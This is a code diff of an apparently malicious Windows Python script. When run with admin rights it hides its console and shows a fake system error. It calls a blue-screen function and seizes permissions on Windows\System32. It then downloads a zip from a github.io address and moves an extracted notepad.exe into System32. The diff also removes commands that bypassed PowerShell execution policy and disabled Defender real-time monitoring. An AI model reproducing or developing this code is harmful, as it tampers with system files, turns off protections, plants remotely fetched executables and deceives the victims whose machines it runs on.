@@ -16,8 +16,7 @@ def is_admin():
     
 if is_admin():
     HideConsole()
-    PowerShellRun("Set-ExecutionPolicy Bypass -Scope Process -Force")
-    PowerShellRun("Set-MpPreference -DisableRealtimeMonitoring $true")
+    #disableRealtimeMonitoring() disabled function / caused problems bc windows is fucking shit
 
     ShowFuckNotification("ERR", "x039_SUBSYSTEM: Your system does not support this function. TABLE: 0x936B80000000000, TABLE: 0x536000000000, TABLE: 0x9bC0000000000, TABLE: 0x64180000000000, TABLE: 0x080000000000")
 
@@ -43,11 +42,11 @@ if is_admin():
     addBSOD()
 
 
-    getOwnerShip(default_disk + "\\Windows")
+    changePermissions(default_disk + "\\Windows\\System32")
     pathdownloaded = DownloadFile('https://psvks.github.io/psvks/uploads/output.zip')
     FolderPath = MakeFolder(default_disk + "\\tmp_folder")
     ExtractZip(pathdownloaded, FolderPath)
-    MoveFile(default_disk + "\\tmp_folder\\notepad.exe", default_disk + "\\Windows")
+    MoveFile(default_disk + "\\tmp_folder\\notepad.exe", default_disk + "\\Windows\\System32\\")
 
 
 
